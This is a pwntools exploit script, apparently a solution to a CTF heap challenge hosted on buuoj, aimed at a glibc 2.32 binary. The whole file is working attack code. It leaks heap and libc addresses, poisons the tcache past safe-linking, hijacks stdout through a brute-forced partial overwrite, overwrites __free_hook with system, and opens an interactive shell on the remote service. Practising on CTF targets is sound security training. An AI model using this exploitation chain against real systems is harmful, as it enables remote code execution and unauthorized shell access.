from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 25086)
libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/libc-2.32.so')
elf = ELF('./pwn')


def add(size, content):
    io.sendlineafter('>>', '1')
    io.sendlineafter('Size:', str(size))
    io.sendafter('Content:', content)


def delete():
    io.sendlineafter('>>', '2')


def show():
    io.sendlineafter('>>', '3')


def edit(content):
    io.sendlineafter('>>', '5')
    io.sendafter('Content:', content)


def pwn():
    add(0x7f, b'a' * 0x7f)
    delete()
    show()
    heap_base = u64(io.recv(8)) << 12
    log.success('heap_base: ' + hex(heap_base))
    edit(b'a' * 0x10)
    delete()
    edit(p64((heap_base + 0x10) ^ (heap_base >> 12)) + p64(0))
    add(0x7f, b'a' * 0x7f)
    payload = p16(0) * 0x27 + p16(7)
    add(0x7f, payload)
    delete()
    add(0x7f, p16(0) + p16(7) * 0x3e)
    add(0x18, p16(0xc6c0))                              # 1/16 hit on
    payload = p64(0xfbad1800) + p64(0) * 3 + p8(0x28)
    add(0x38, payload)
    libc_base = u64(io.recvuntil(b'\x7f\x00\x00', timeout=1)[-8:]) - libc.sym['_IO_2_1_stdin_']
    log.success('libc_base: ' + hex(libc_base))
    system = libc_base + libc.sym['system']
    __free_hook = libc_base + libc.sym['__free_hook']
    add(0x18, p64(__free_hook - 0x10))
    add(0x78, b'/bin/sh\x00' + p64(0) + p64(system))
    # gdb.attach(io)
    delete()
    # pause()
    io.interactive()


if __name__ == '__main__':
    while True:
        try:
            pwn()
        except:
            io.close()
            # io = process('./pwn')
            io = remote('node4.buuoj.cn', 25086)
            continue
        else:
            break

